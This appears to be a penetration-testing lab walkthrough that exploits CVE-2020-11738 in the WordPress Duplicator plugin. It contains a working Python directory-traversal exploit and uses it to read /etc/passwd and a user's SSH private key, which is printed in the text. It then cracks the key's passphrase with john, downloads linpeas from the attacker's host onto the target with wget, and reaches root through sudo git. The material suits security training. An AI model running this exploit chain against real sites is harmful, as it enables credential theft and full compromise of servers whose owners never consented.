### Exploiting CVE-2020-11738 in Duplicator 1.3.26

#### Python Script for Directory Traversal
The following Python script exploits the Directory Traversal vulnerability (CVE-2020-11738) in Duplicator 1.3.26 to read arbitrary files from the server.

```python
import sys
import requests

if len(sys.argv) != 3:
    print("Exploit made by nam3lum.")
    print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
    exit()

url = sys.argv[1]
file_path = sys.argv[2]

exploit_url = f"{url}/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../..{file_path}"
response = requests.get(exploit_url)

print(response.text)
```

#### Example Usage
To use the script, provide the URL of the target and the file you want to retrieve. For example, to read `/etc/passwd`:

```bash
kali@kali:~/beyond/websrv1$ python3 CVE-2020-11738.py http://192.168.50.244 /etc/passwd
```

#### Output
The script will output the contents of the requested file. For example, reading `/etc/passwd`:

```bash
root:x:0:0:root:/root:/bin/bash
...
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```

### Retrieving SSH Private Keys
Next, we attempt to retrieve an SSH private key from the home directories of the identified users, `daniela` and `marcus`.

#### Attempt to Retrieve SSH Private Key
```bash
kali@kali:~/beyond/websrv1$ python3 CVE-2020-11738.py http://192.168.50.244 /home/marcus/.ssh/id_rsa
Invalid installer file name!!
kali@kali:~/beyond/websrv1$ python3 CVE-2020-11738.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
...
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----
```

#### Save and Use the SSH Private Key
Save the retrieved SSH private key to a file and set appropriate permissions:

```bash
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa
```

Attempt to connect via SSH:

```bash
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':
```

#### Cracking the Passphrase
If the SSH key is protected by a passphrase, use `ssh2john` and `john` with the `rockyou.txt` wordlist to crack it:

```bash
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash
kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho (id_rsa)
...
```

#### Access the System
Use the cracked passphrase to access the system via SSH:

```bash
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$
```

### Local Enumeration and Privilege Escalation
After gaining initial access, perform local enumeration using `linpeas.sh` to identify potential privilege escalation vectors.

#### Copy and Serve `linpeas.sh`
Copy `linpeas.sh` to the target directory and start a Python web server:

```bash
kali@kali:~/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .
kali@kali:~/beyond/websrv1$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Download and run `linpeas.sh` on the target:

```bash
daniela@websrv1:~$ wget http://192.168.119.5/linpeas.sh
daniela@websrv1:~$ chmod a+x ./linpeas.sh
daniela@websrv1:~$ ./linpeas.sh
```

#### Review `linpeas` Output
Review the `linpeas` output for system information, network interfaces, and sudo privileges:

```bash
╔══════════╣ Operative system
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022
Distributor ID: Ubuntu
Description: Ubuntu 22.04.1 LTS
Release: 22.04
Codename: jammy

╔══════════╣ Interfaces
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host
valid_lft forever preferred_lft forever
2: ens192:  mtu 1500 qdisc fyq_codel state UP group default qlen 1000
link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
altname enp11s0
inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
valid_lft forever preferred_lft forever
inet6 fe80::250:56ff:fe8a:265d/64 scope link
valid_lft forever preferred_lft forever

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
User daniela may run the following commands on websrv1:
(ALL) NOPASSWD: /usr/bin/git
```

#### Privilege Escalation via `git`
Since `daniela` can run `/usr/bin/git` with sudo privileges, consult GTFOBins for potential abuse vectors:

```bash
daniela@websrv1:~$ sudo git -p help config
!/bin/bash
root@websrv1:/home/daniela# whoami
root
```

### Conclusion
With root privileges, continue enumerating the system and search for additional sensitive information or vulnerabilities.